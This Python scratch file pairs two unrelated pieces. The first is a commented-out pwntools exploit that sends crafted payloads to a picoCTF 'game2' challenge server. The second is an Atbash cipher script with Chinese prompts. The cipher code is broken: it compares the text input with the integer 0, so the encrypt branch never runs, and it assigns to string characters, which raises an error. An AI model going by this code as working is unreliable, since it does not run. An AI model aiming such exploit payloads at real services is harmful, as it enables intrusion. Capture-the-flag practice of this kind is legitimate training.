from pwn import *

# p = process('./game2')

# # while True:
# def run():
#     p = remote('saturn.picoctf.net', 55451)
#     payload = b'l' + b'\x7c'
#     p.sendline(payload)
#     payload = b'a' * 5
#     payload += b'a' * 38
#     p.sendline(payload)
#     payload = b'w' * 4
#     p.sendline(payload)
#     p.interactive()
# run()

key = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
choise = input("0:加密，1:解密")
key.split()
if choise == 0:
    plain = input("please input plaintext:>")
    plain.split()
    for i in range(len(plain)):
        for x in range(26):
            if plain[i] == key[x]:
                plain[i] = key[25-x]
    print(plain)
else:
    ciphertext = input("please input ciphertext:>")
    ciphertext.split()
    for i in range(len(ciphertext)):
        for x in range(26):
            if ciphertext[i] == key[x]:
                ciphertext[i] = key[25-x]
    print(ciphertext)
